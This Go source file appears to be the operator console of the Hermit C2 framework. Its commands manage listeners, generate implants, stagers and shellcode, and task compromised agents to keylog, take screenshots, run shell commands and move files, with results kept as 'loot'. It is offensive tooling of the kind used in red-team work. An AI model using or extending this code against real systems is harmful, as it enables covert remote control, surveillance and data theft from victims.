package console

import (
	"fmt"
	"io"
	"os"
	"strings"
	"syscall"

	"github.com/chzyer/readline"
	"github.com/fatih/color"

	"github.com/hideckies/hermit/pkg/common/meta"
	"github.com/hideckies/hermit/pkg/common/stdin"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/common/wizard"
	"github.com/hideckies/hermit/pkg/server/agent"
	"github.com/hideckies/hermit/pkg/server/handler"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/loot"
	"github.com/hideckies/hermit/pkg/server/operator"
	"github.com/hideckies/hermit/pkg/server/state"
	"github.com/hideckies/hermit/pkg/server/task"
)

func Readline(serverState *state.ServerState, adminUuid string) {
	// Wait for the RPC server starts to avoid the prompt displays before the "C2 server started" message.
	<-serverState.Job.ChServerStarted

	defaultPrompt := stdin.MakePrompt("", "")
	historyFile := "/tmp/readline.tmp"
	l, err := stdin.NewReadlineInstance(defaultPrompt, historyFile)
	if err != nil {
		stdout.LogFailed(fmt.Sprint(err))
		os.Exit(1)
	}
	defer l.Close()
	l.CaptureExitSignal()

	stdout.LogInfo("The console starts.")
	stdout.LogInfo("Run `help` or `?` for the usage.\n\n")

	for {
		// Make prompt
		var p string
		if serverState.AgentMode.Name == "" {
			p = stdin.MakePrompt("", "")
		} else {
			p = stdin.MakePrompt("", serverState.AgentMode.Name)
		}
		l.SetPrompt(p)

		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		// Remove redundant spaces
		line = utils.StandardizeSpaces(line)

		if serverState.AgentMode.Name == "" {
			switch {
			// COMMON
			case line == "help", line == "?":
				stdin.ConsoleUsage(l.Stderr(), false, serverState.AgentMode.Name != "")
			case line == "version":
				stdout.LogSuccess(meta.GetVersion())
			case line == "exit", line == "quit":
				goto exit
			// CONFIG
			case line == "client-config gen":
				err := handler.ConfigGenClient(
					serverState.Conf.Host,
					serverState.Conf.Port,
					serverState.Conf.Domains,
				)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
			// OPERATOR
			case line == "operator whoami":
				stdout.LogSuccess("admin")
			case strings.HasPrefix(line, "operator info "):
				operatorId, err := stdin.ParseArgUint(line, 14)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				op, err := serverState.DB.OperatorGetById(uint(operatorId))
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				operator.PrintOperators([]*operator.Operator{op}, adminUuid)
			case line == "operator list", line == "operators":
				ops, err := serverState.DB.OperatorGetAll()
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				operator.PrintOperators(ops, adminUuid)
			// LISTENER
			case line == "listener start":
				lis, err := wizard.WizardListenerStart(
					meta.GetSpecificHost(serverState.Conf.Host), serverState.Conf.Domains)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				go handler.ListenerStart(lis, serverState)
				err = serverState.Job.WaitListenerStart(serverState.DB, lis)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("Listener started.")
			case strings.HasPrefix(line, "listener start "):
				listenerId, err := stdin.ParseArgUint(line, 15)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				lis, err := serverState.DB.ListenerGetById(listenerId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if lis.Active {
					stdout.LogWarn("The listener is already running.")
					continue
				}
				go handler.ListenerStart(lis, serverState)
				err = serverState.Job.WaitListenerStart(serverState.DB, lis)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("Listener started.")
			case strings.HasPrefix(line, "listener stop "):
				listenerId, err := stdin.ParseArgUint(line, 14)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				lis, err := serverState.DB.ListenerGetById(listenerId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if !lis.Active {
					stdout.LogFailed("Listener already stopped.")
					continue
				}
				serverState.Job.ChReqListenerQuit <- lis.Uuid
				err = serverState.Job.WaitListenerStop(serverState.DB, lis)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("Listener stopped.")
			case strings.HasPrefix(line, "listener delete "):
				listenerId, err := stdin.ParseArgUint(line, 15)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				lis, err := serverState.DB.ListenerGetById(listenerId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if lis.Active {
					stdout.LogFailed("The listener is running. Stop it before deleting.")
					continue
				}
				err = serverState.DB.ListenerDeleteById(listenerId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				// Delete folder
				listenerDir, err := meta.GetListenerDir(lis.Name, false)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				err = os.RemoveAll(listenerDir)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("The listener deleted.")
			case strings.HasPrefix(line, "listener info "):
				listenerId, err := stdin.ParseArgUint(line, 14)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				lis, err := serverState.DB.ListenerGetById(listenerId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				listener.PrintListeners([]*listener.Listener{lis})
			case strings.HasPrefix(line, "listener payloads "):
				listenerId, err := stdin.ParseArgUint(line, 18)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				lis, err := serverState.DB.ListenerGetById(listenerId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}

				// List payloads on the listener
				payloads, err := meta.GetPayloadPaths(lis.Name, false, true)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}

				if len(payloads) == 0 {
					stdout.LogWarn("Payloads not found.")
					continue
				}

				// As needed, delete a specific payload.
				payloads = append(payloads, "Cancel")
				label := fmt.Sprintf("Payloads hosted on %s", lis.Name)
				res, err := stdin.Select(label, payloads)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if res == "Cancel" {
					stdout.LogWarn("Canceled.")
					continue
				}
				isDelete, err := stdin.Confirm(fmt.Sprintf("Delete '%s'?", res))
				if isDelete {
					payloadsDir, err := meta.GetPayloadsDir(lis.Name, false)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						continue
					}
					err = os.RemoveAll(fmt.Sprintf("%s/%s", payloadsDir, res))
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						continue
					}

					stdout.LogSuccess("Payload deleted.")
				} else {
					stdout.LogWarn("Canceled")
				}
			case line == "listener list", line == "listeners":
				liss, err := serverState.DB.ListenerGetAll()
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				listener.PrintListeners(liss)
			// PAYLOAD
			case line == "payload gen":
				// Get listeners for generating a payload from listener settings
				liss, err := serverState.DB.ListenerGetAll()
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.PrintBannerPayload()
				payloadType := wizard.WizardPayloadType()

				if strings.HasPrefix(payloadType, "implant") {
					imp, err := wizard.WizardPayloadImplantGenerate(
						meta.GetSpecificHost(serverState.Conf.Host),
						liss,
						payloadType,
					)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						continue
					}
					fmt.Println()
					spin := stdout.NewSpinner("Generating an implant...")
					spin.Start()
					_, outFile, err := imp.Generate(serverState)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						spin.Stop()
						continue
					}
					spin.Stop()
					stdout.LogSuccess(fmt.Sprintf("Implant saved at %s", color.HiGreenString(outFile)))
				} else if strings.HasPrefix(payloadType, "stager") {
					stg, err := wizard.WizardPayloadStagerGenerate(
						meta.GetSpecificHost(serverState.Conf.Host),
						liss,
						payloadType,
					)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						continue
					}
					fmt.Println()
					spin := stdout.NewSpinner("Generating a stager...")
					spin.Start()
					_, outFile, err := stg.Generate(serverState)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						spin.Stop()
						continue
					}
					spin.Stop()
					stdout.LogSuccess(fmt.Sprintf("Stager saved at %s", color.HiGreenString(outFile)))
				} else if strings.HasPrefix(payloadType, "shellcode") {
					shc, err := wizard.WizardPayloadShellcodeGenerate(
						meta.GetSpecificHost(serverState.Conf.Host),
						liss,
						payloadType,
					)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						continue
					}
					fmt.Println()
					spin := stdout.NewSpinner("Generating a shellcode...")
					spin.Start()
					_, outFile, err := shc.Generate(serverState)
					if err != nil {
						stdout.LogFailed(fmt.Sprint(err))
						spin.Stop()
						continue
					}
					spin.Stop()
					stdout.LogSuccess(fmt.Sprintf("Shellcode saved at %s", color.HiGreenString(outFile)))
				} else {
					stdout.LogFailed("Invalid payload type.")
					continue
				}
			// AGENT
			case strings.HasPrefix(line, "agent use "):
				agentId, err := stdin.ParseArgUint(line, 10)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				ag, err := serverState.DB.AgentGetById(agentId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				// Set agent status
				serverState.AgentMode.Uuid = ag.Uuid
				serverState.AgentMode.Name = ag.Name

				stdout.LogSuccess("Switched to agent mode.")
			case strings.HasPrefix(line, "agent delete "):
				agentId, err := stdin.ParseArgUint(line, 13)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}

				// Check if the agent exists
				ag, err := serverState.DB.AgentGetById(agentId)
				if err != nil {
					stdout.LogFailed(fmt.Sprintf("Agent does not exist: %v\n", err))
					continue
				}

				res, err := stdin.Confirm("Are you sure you want to delete the agent?")
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if !res {
					stdout.LogFailed("Canceled")
					continue
				}

				// Delete the agent from database
				err = serverState.DB.AgentDeleteById(agentId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				// Delete the related folder
				lootAgentDir, err := meta.GetLootAgentDir(ag.Name, false)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				err = os.RemoveAll(lootAgentDir)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("Agent deleted.")
			case strings.HasPrefix(line, "agent info "):
				agentId, err := stdin.ParseArgUint(line, 11)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				ag, err := serverState.DB.AgentGetById(agentId)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				agent.PrintAgents([]*agent.Agent{ag})
			case line == "agent list", line == "agents":
				ags, err := serverState.DB.AgentGetAll()
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				agent.PrintAgents(ags)
			// MISC
			case line == "":
			default:
				stdout.LogFailed(fmt.Sprintf("Invalid command: `%s`", line))
			}

		} else {
			// **AGENT MODE**
			switch {
			// COMMON
			case line == "help", line == "?":
				stdin.ConsoleUsage(l.Stderr(), false, serverState.AgentMode.Name != "")
			case line == "version":
				stdout.LogSuccess(meta.GetVersion())
			case line == "exit", line == "quit":
				// Go back to the root mode
				serverState.AgentMode = state.AgentMode{}
			// AGENT
			case line == "agent info":
				ag, err := serverState.DB.AgentGetByUuid(serverState.AgentMode.Uuid)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				agent.PrintAgents([]*agent.Agent{ag})
			// TASK
			case
				strings.HasPrefix(line, "cat "),
				strings.HasPrefix(line, "cd "),
				strings.HasPrefix(line, "cp "),
				strings.HasPrefix(line, "download "),
				strings.HasPrefix(line, "keylog "),
				line == "ls", strings.HasPrefix(line, "ls "),
				strings.HasPrefix(line, "mkdir"),
				line == "pwd",
				strings.HasPrefix(line, "rm "),
				strings.HasPrefix(line, "rmdir "),
				line == "screenshot",
				strings.HasPrefix(line, "shell "),
				strings.HasPrefix(line, "sleep "),
				strings.HasPrefix(line, "upload "),
				line == "whoami":
				// Set a task into the task list file
				err := task.SetTask(line, serverState.AgentMode.Name)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("Task set successfully.")
			case line == "task clean":
				res, err := stdin.Confirm("Are you sure you want to delete all tasks?")
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if !res {
					stdout.LogInfo("Canceled.")
					continue
				}

				err = meta.DeleteAllTasks(serverState.AgentMode.Name, false)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("All tasks deleted successfully.")
			case line == "task list", line == "tasks":
				tasks, err := meta.ReadTasks(serverState.AgentMode.Name, false)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if len(tasks) == 0 {
					stdout.LogWarn("Tasks not set.")
					continue
				}

				stdout.LogSuccess("Task List")
				for _, task := range tasks {
					fmt.Println(task)
				}
			// LOOT
			case line == "loot":
				allLoot, err := loot.GetAllLoot(serverState.AgentMode.Name)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("")
				fmt.Println(allLoot)
			case line == "loot clean":
				res, err := stdin.Confirm("Are you sure you want to delete all task results?")
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				if !res {
					stdout.LogInfo("Canceled.")
					continue
				}

				err = meta.DeleteAllTaskResults(serverState.AgentMode.Name, false)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				stdout.LogSuccess("Loot deleted successfully.")
			// MISC
			case line == "":
			default:
				stdout.LogFailed(fmt.Sprintf("Invalid command: `%s`", line))
			}
		}
	}
exit:
	serverState.Job.ChQuit <- syscall.SIGINT
}
